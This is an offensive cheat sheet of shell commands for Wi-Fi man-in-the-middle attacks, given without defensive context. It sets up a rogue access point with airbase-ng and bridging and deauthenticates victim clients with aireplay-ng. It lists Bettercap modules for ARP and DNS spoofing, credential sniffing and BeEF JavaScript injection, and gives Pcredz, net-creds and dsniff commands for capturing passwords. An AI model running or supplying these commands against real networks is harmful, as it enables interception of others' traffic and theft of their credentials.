### Airmon-ng MITM ###
    $ airmon-ng start wlan0 
    $ airbase-ng –e “<FakeBSSID>” wlan0mon
    $ brctl addbr <VariableName>
    $ brctl addif <VariableName> wlan0mon
    $ brctl addif <VariableName> at0
    $ ifconfig eth0 0.0.0.0 up
    $ ifconfig at0 0.0.0.0 up
    $ ifconfig <VariableName> up
    $ aireplay-ng –deauth 0 –a <victimBSSID> wlan0mon
    $ dhclient3 <VariableName> & wireshark & ;select <VariableName> interface 

### Bettercap MITM ###
  $ sudo bettercap -iface eth0 -eval "set wifi.interface wlan0; wifi.recon on"
  # Other options for MITM in Bettercap:
    ARP Spoofing - Bettercap > arp.spoof module (Not needed when client connected to rogue AP because attacker already in position of MitM)
    DNS Spoofing - Bettercap > dns.spoof module
    Credentials Sniffing - Bettercap > net.sniff module
    JS Injection - Bettercap > caplet beef-active

### Credentials Sniffing ###
    $ sudo pipenv run python Pcredz -i wlan0mon -v
    $ python net-creds.py -I <interface>
    $ dsniff -i <interface>
